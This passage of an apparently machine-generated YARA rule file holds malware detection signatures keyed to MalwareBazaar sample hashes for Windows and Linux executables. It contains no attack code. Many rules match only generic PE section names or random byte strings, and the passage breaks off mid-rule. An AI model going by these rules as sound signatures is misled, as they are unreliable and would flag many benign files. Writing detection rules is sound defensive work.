        description = "Auto ML: 156e13c6490c8301b32f8002b493756b705267eb7c5463e673b905fe265f7470"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB
        and all of them
}

rule Linux_da110c064198aaf76bd0e6dd42108d40ed13aecd3c94a404c61f142bc5408504
{
    meta:
        description = "Auto ML: da110c064198aaf76bd0e6dd42108d40ed13aecd3c94a404c61f142bc5408504"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB
        and all of them
}

rule Windows_da13f66fcc1656d7c8e1b767574c3e0738e74b2be244ab7d8742cd288277e7ab
{
    meta:
        description = "Auto ML: da13f66fcc1656d7c8e1b767574c3e0738e74b2be244ab7d8742cd288277e7ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "InnoSdJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4762KB
        and all of them
}

rule Linux_da213006b4b1e1320baf8dec0c35c776f20a5e7ccc684363fd7f74547ce04f24
{
    meta:
        description = "Auto ML: da213006b4b1e1320baf8dec0c35c776f20a5e7ccc684363fd7f74547ce04f24"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "GqDq5S"
        $s4 = "]pwlu#"
        $s5 = "H3MD@t+"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB
        and all of them
}

rule Windows_da2e82a165342cbabe9bfcc46865d2fc2b707914905ea174bb444588a2780bd3
{
    meta:
        description = "Auto ML: da2e82a165342cbabe9bfcc46865d2fc2b707914905ea174bb444588a2780bd3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "c Lz,#X"
        $s5 = "PSe h<"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB
        and all of them
}

rule Windows_da58a7dd541fd3b0b3b8f7cb7dcf85e4c3dbf1ef8503f5503edccbc644bc2611
{
    meta:
        description = "Auto ML: da58a7dd541fd3b0b3b8f7cb7dcf85e4c3dbf1ef8503f5503edccbc644bc2611"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 50582KB
        and all of them
}

rule Windows_da82319d644e8316e8271b697d5c5df9e20d7edba7f61aafca3c0e2b94440899
{
    meta:
        description = "Auto ML: da82319d644e8316e8271b697d5c5df9e20d7edba7f61aafca3c0e2b94440899"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "fzKU V\""
        $s3 = ".EExJe"
        $s4 = "AxJJdPyO"
        $s5 = "j}NN._JuqTQ/%"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1832KB
        and all of them
}

rule Windows_da8c10c9df64141f2e0eccea6bd14a3d836b49e83d6681dcb849d8991a0b44a0
{
    meta:
        description = "Auto ML: da8c10c9df64141f2e0eccea6bd14a3d836b49e83d6681dcb849d8991a0b44a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5962KB
        and all of them
}

rule Windows_daa74b36d89c37396f2df487ad202f513ea6779793e7a3fc6243d33d8f82fbea
{
    meta:
        description = "Auto ML: daa74b36d89c37396f2df487ad202f513ea6779793e7a3fc6243d33d8f82fbea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4606KB
        and all of them
}

rule Windows_daa8db2383e3d9fe6cc680385e04fd9aeecee60bc13a4d7c75e55d8d40258d58
{
    meta:
        description = "Auto ML: daa8db2383e3d9fe6cc680385e04fd9aeecee60bc13a4d7c75e55d8d40258d58"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SSSSSS"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 684KB
        and all of them
}

rule Windows_dafd45f3a2c91c287da7690b5688bf1b0af06d48ce91335c04425943a62a82f8
{
    meta:
        description = "Auto ML: dafd45f3a2c91c287da7690b5688bf1b0af06d48ce91335c04425943a62a82f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ">Z\"@]FJY"
        $s5 = "#Strings"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 722KB
        and all of them
}

rule Windows_1574b3cafdacf7e9738e58c9b77b8fc7ccbcc8f152c246f704e45121e9ea4443
{
    meta:
        description = "Auto ML: 1574b3cafdacf7e9738e58c9b77b8fc7ccbcc8f152c246f704e45121e9ea4443"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.fat0"
        $s4 = "WS)hywp"
        $s5 = "(gJ,Mfl3"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6362KB
        and all of them
}

rule Windows_daff6ed76092cbee2ba195c52fe0d91888910706a5a43629973dc5aa19cccf86
{
    meta:
        description = "Auto ML: daff6ed76092cbee2ba195c52fe0d91888910706a5a43629973dc5aa19cccf86"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1541KB
        and all of them
}

rule Windows_db166d0df8c59f9292ac47d5ae910cee4f85407a8208d0c2743ef85ae752ff85
{
    meta:
        description = "Auto ML: db166d0df8c59f9292ac47d5ae910cee4f85407a8208d0c2743ef85ae752ff85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "AM )UU"
        $s5 = "e ,X%pa"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2536KB
        and all of them
}

rule Windows_db527c3116d3f996e6648ad18e91959156f192e58c31499b899468c495f3ce9f
{
    meta:
        description = "Auto ML: db527c3116d3f996e6648ad18e91959156f192e58c31499b899468c495f3ce9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "P.idata"
        $s5 = "@.edata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1352KB
        and all of them
}

rule Linux_db597815bfff48483f47b749fe31ecdb7eeff5ae8876ff96af4157b402edf0a4
{
    meta:
        description = "Auto ML: db597815bfff48483f47b749fe31ecdb7eeff5ae8876ff96af4157b402edf0a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$JPPj"
        $s2 = "D$$PWV"
        $s3 = "D$(;|$(tlPPj"
        $s4 = "9|$$tBPPj"
        $s5 = "T$`VVj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB
        and all of them
}

rule Windows_db726961f1431fd7343b23e90a146a7fd19233d4980815f2d68d50c36bc1175d
{
    meta:
        description = "Auto ML: db726961f1431fd7343b23e90a146a7fd19233d4980815f2d68d50c36bc1175d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".jofaxux"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_db991cc74187143266c8233db17eee6449754fb5f3f1ccff562ea3f3471729d8
{
    meta:
        description = "Auto ML: db991cc74187143266c8233db17eee6449754fb5f3f1ccff562ea3f3471729d8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_dbcf21a27c826ebb4fc94610736aa18c005732200939e30a3d39f8b96c7ed860
{
    meta:
        description = "Auto ML: dbcf21a27c826ebb4fc94610736aa18c005732200939e30a3d39f8b96c7ed860"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2397KB
        and all of them
}

rule Linux_dbed90be7333119e1c0bc18fe88ca3e6d497774feeccef3d28eeae794b69068a
{
    meta:
        description = "Auto ML: dbed90be7333119e1c0bc18fe88ca3e6d497774feeccef3d28eeae794b69068a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ",|V>diH"
        $s2 = "+qaI7n"
        $s3 = "IaY(C["
        $s4 = "O:m~AT"
        $s5 = "MOzTk:"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_dc0621450142b54d1bae6fe4ceff77ef0e31e26b3626c9f29ff9ba4a1a9a6274
{
    meta:
        description = "Auto ML: dc0621450142b54d1bae6fe4ceff77ef0e31e26b3626c9f29ff9ba4a1a9a6274"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "List`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 902KB
        and all of them
}

rule Linux_dc1a9582d0b1813e52c7d8f344cca98dec098b9b41a7bf174883211c8b6ebaef
{
    meta:
        description = "Auto ML: dc1a9582d0b1813e52c7d8f344cca98dec098b9b41a7bf174883211c8b6ebaef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "1Cv[#A4A"
        $s2 = "QGIE i"
        $s3 = "jjC;L4"
        $s4 = "VtLv!P"
        $s5 = "]j>sGk"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 41KB
        and all of them
}

rule Linux_1580e549e2df14253e701b7f032623000d69e1c729614654d8d94f11dde8f40a
{
    meta:
        description = "Auto ML: 1580e549e2df14253e701b7f032623000d69e1c729614654d8d94f11dde8f40a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$Dh B"
        $s2 = "L$p9L$l"
        $s3 = "D$(XZj"
        $s4 = "D$$PSV"
        $s5 = "xAPPSh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB
        and all of them
}

rule Linux_dc564c16d59f7e130c21b7eefda20d7e3048519ba9b56743774537a807f9a3d6
{
    meta:
        description = "Auto ML: dc564c16d59f7e130c21b7eefda20d7e3048519ba9b56743774537a807f9a3d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "k_wmU{j'"
        $s4 = "EsKwxd"
        $s5 = "D@WjphP0:c"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Windows_dc8351cb804dc063b27136910868381f2219662a9634a89853f72031de99585a
{
    meta:
        description = "Auto ML: dc8351cb804dc063b27136910868381f2219662a9634a89853f72031de99585a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14KB
        and all of them
}

rule Windows_dca046105d494683efab5e3ac33d9948c978c255d1cfc8783f03a1414d458c09
{
    meta:
        description = "Auto ML: dca046105d494683efab5e3ac33d9948c978c255d1cfc8783f03a1414d458c09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "8$plHT"
        $s5 = "THlp$8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1931KB
        and all of them
}

rule Windows_dcb852bbdd6ebe2221c3e5126c3d0ad98c626f1cdc425fc1b68dbf59eb798a45
{
    meta:
        description = "Auto ML: dcb852bbdd6ebe2221c3e5126c3d0ad98c626f1cdc425fc1b68dbf59eb798a45"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3189KB
        and all of them
}

rule Windows_dccf17e32afc8abc1e8179411260ffe7971826da058cf4f57162c17560c16920
{
    meta:
        description = "Auto ML: dccf17e32afc8abc1e8179411260ffe7971826da058cf4f57162c17560c16920"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".xenoluv"
        $s5 = "HHtXHHt"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 290KB
        and all of them
}

rule Windows_dcf14d2ca4c03349e53216c94512cf010326fa9ff35978e8cd7684862ce14c90
{
    meta:
        description = "Auto ML: dcf14d2ca4c03349e53216c94512cf010326fa9ff35978e8cd7684862ce14c90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "fffff."
        $s5 = "Gffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 586KB
        and all of them
}

rule Windows_dd02b4f83462302b06278dea2591a9d32ab4534743f96b44b24d642e55b721fb
{
    meta:
        description = "Auto ML: dd02b4f83462302b06278dea2591a9d32ab4534743f96b44b24d642e55b721fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "PQhL/B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB
        and all of them
}

rule Windows_dd2bb6ea65c082f25a75158f22c2d10e3be1daa026334a8d8e06007bbd245f70
{
    meta:
        description = "Auto ML: dd2bb6ea65c082f25a75158f22c2d10e3be1daa026334a8d8e06007bbd245f70"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "D@xw7W"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB
        and all of them
}

rule Windows_dd7f5bd431c5ef84cc58b490eed097e76b800d6c822de3de6d68d88881626a3b
{
    meta:
        description = "Auto ML: dd7f5bd431c5ef84cc58b490eed097e76b800d6c822de3de6d68d88881626a3b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "o(((Y(M(E(](((((((^(A(Z(\\(A(G(((^(E(_(I(Z(M(((^(J(G(P(((((((P(M(F((((((((((vw"
        $s3 = "^-[@X^O@-[@@BX^-[@"
        $s4 = "I@]-[@_LZI-[@@H@N-[OBUJX-[OBU^K-[OBU@B-[OBU[D-[OBUID-[DB^H_--sr"
        $s5 = "V^ZU]hEJJ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 37KB
        and all of them
}

rule Linux_dd82275e129410cf5dea29c7f99f949c7a194bf01691d165c1b11318c01ac5c8
{
    meta:
        description = "Auto ML: dd82275e129410cf5dea29c7f99f949c7a194bf01691d165c1b11318c01ac5c8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x}%KxH"
        $s2 = "x}$KxH"
        $s3 = "x}d[x}%KxK"
        $s4 = "}f[x}GSxH"
        $s5 = "x}'KxH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 79KB
        and all of them
}

rule Windows_1582d6131090e7a8c618a7cd3cec1adf0418bb6654a79db1a337525b5d50aa30
{
    meta:
        description = "Auto ML: 1582d6131090e7a8c618a7cd3cec1adf0418bb6654a79db1a337525b5d50aa30"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "LvT~X+"
        $s5 = "c_ StX"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 474KB
        and all of them
}

rule Windows_ddaa5cc1391856c03a01c6273c79698851078f211eba06dd002c7b4f3ccf75c0
{
    meta:
        description = "Auto ML: ddaa5cc1391856c03a01c6273c79698851078f211eba06dd002c7b4f3ccf75c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = ".gfids"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 483KB
        and all of them
}

rule Windows_ddb04224fdedc7b6e5e034aa071ed1f27ab81e680070cb38a31088835fb87dbf
{
    meta:
        description = "Auto ML: ddb04224fdedc7b6e5e034aa071ed1f27ab81e680070cb38a31088835fb87dbf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.vmp*C"
        $s5 = ".vmp*C"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6326KB
        and all of them
}

rule Windows_ddb34974223511c96173ac8099a9f7ac85c30773c19257137ade8da83f7d4120
{
    meta:
        description = "Auto ML: ddb34974223511c96173ac8099a9f7ac85c30773c19257137ade8da83f7d4120"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3997KB
        and all of them
}

rule Linux_dde5ac7c19bcf11762b0eb96b0f40a1456d3fbbf61ca101b3590b2870a461f0c
{
    meta:
        description = "Auto ML: dde5ac7c19bcf11762b0eb96b0f40a1456d3fbbf61ca101b3590b2870a461f0c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ") 'uynM"
        $s2 = "!:yvfR"
        $s3 = "BCxLTI"
        $s4 = "wA.JE4"
        $s5 = "6AV?EhBU"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 56KB
        and all of them
}

rule Windows_ddfdcd1867cf1462a6b507d71eb15dd91703c06f55def388c81277c406c3f76d
{
    meta:
        description = "Auto ML: ddfdcd1867cf1462a6b507d71eb15dd91703c06f55def388c81277c406c3f76d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6884KB
        and all of them
}

rule Windows_de4da24486f406177afea313e60468918398dbbdb3551a7290a4050966494728
{
    meta:
        description = "Auto ML: de4da24486f406177afea313e60468918398dbbdb3551a7290a4050966494728"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = ".symtab"
        $s4 = "Go build ID: \"X6lNEpDhc_qgQl56x4du/fgVJOqLlPCCIekQhFnHL/rkxe6tXCg56Ez88otHrz/Y-lXW-OhiIbzg3-ioGRz\""
        $s5 = "singu?"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3632KB
        and all of them
}

rule Windows_de78554d449ccead169dfee188aea7bbd3e2971441bea3730473e13212e940f4
{
    meta:
        description = "Auto ML: de78554d449ccead169dfee188aea7bbd3e2971441bea3730473e13212e940f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "t/hxAA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 109KB
        and all of them
}

rule Windows_decfaad9816261d3eba76b67c8965ddce1fc2192e039b62e43b297b25650b4cc
{
    meta:
        description = "Auto ML: decfaad9816261d3eba76b67c8965ddce1fc2192e039b62e43b297b25650b4cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "@.imports"
        $s3 = ".LABS+[^"
        $s4 = "@.themida"
        $s5 = "`.LABS+[^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6271KB
        and all of them
}

rule Linux_df12fa13cd681ffbda2930712d4b68844810c559aa3024870550e47d65c74e6e
{
    meta:
        description = "Auto ML: df12fa13cd681ffbda2930712d4b68844810c559aa3024870550e47d65c74e6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "iv-ph/Lk"
        $s2 = "^IN\\CD"
        $s3 = "kz@'YeG"
        $s4 = "Xp%iALs"
        $s5 = "';eDkT"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 31KB
        and all of them
}

rule Windows_df382a4a8891bd1839dd969666839932af21b5b4b0fec15b8c52ae76e2ebb994
{
    meta:
        description = "Auto ML: df382a4a8891bd1839dd969666839932af21b5b4b0fec15b8c52ae76e2ebb994"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.reloc"
        $s3 = "#Strings"
        $s4 = "<Module>"
        $s5 = "System.Reflection"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 93KB
        and all of them
}

rule Windows_158900b745c256a090351228530873b4d3835d79a148927de1415db6965d23dd
{
    meta:
        description = "Auto ML: 158900b745c256a090351228530873b4d3835d79a148927de1415db6965d23dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "FrmIzracun_Student10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 639KB
        and all of them
}

rule Linux_df630714b75ea32ed26efb7693d0d56e3827401dc2482457a40b73719c51c69d
{
    meta:
        description = "Auto ML: df630714b75ea32ed26efb7693d0d56e3827401dc2482457a40b73719c51c69d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HcD$TH"
        $s2 = "HcD$0H"
        $s3 = "HcD$TA"
        $s4 = "X[]A\\A]A^A_"
        $s5 = "HcD$dH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 158KB
        and all of them
}

rule Windows_df74b92aec13912e659a4f5fe8d9b7613806d49bf0ebfa8bd4e42cb957d3f65f
{
    meta:
        description = "Auto ML: df74b92aec13912e659a4f5fe8d9b7613806d49bf0ebfa8bd4e42cb957d3f65f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15459KB
        and all of them
}

rule Windows_df7b3f70371116dcbde25dd117254de513f9abe9ca80559498c38cfa04b6503f
{
    meta:
        description = "Auto ML: df7b3f70371116dcbde25dd117254de513f9abe9ca80559498c38cfa04b6503f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4598KB
        and all of them
}

rule Windows_df95e225feeb2e8547d53ac6760e13c8ce7a9a0858e71df3a4509663285f7cd3
{
    meta:
        description = "Auto ML: df95e225feeb2e8547d53ac6760e13c8ce7a9a0858e71df3a4509663285f7cd3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 932KB
        and all of them
}

rule Windows_dfc2549bb01c896ce859ef5b081d26128ea36cf31321450ec9c3b89f6fbcd620
{
    meta:
